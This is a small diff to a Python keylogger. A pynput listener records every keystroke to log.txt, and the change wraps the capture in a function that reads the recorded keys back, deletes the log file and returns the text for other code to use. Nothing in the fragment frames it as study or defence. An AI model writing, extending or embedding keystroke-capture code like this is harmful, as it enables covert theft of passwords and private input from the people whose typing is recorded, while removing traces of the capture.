@@ -12,11 +12,13 @@ def on_press(key):
         file.write(' ')
     #print(key)
 
-def start_keylog():
+def keylogThread():
     with Listener(on_press=on_press) as listener:
         listener.join()
-
-start_keylog()
-with open('log.txt','r') as file:
-    res = file.read()
-os.remove('log.txt')
+        
+def start_keylog():
+    keylogThread()
+    with open('log.txt','r') as file:
+        res = file.read()
+    os.remove('log.txt')
+    return res
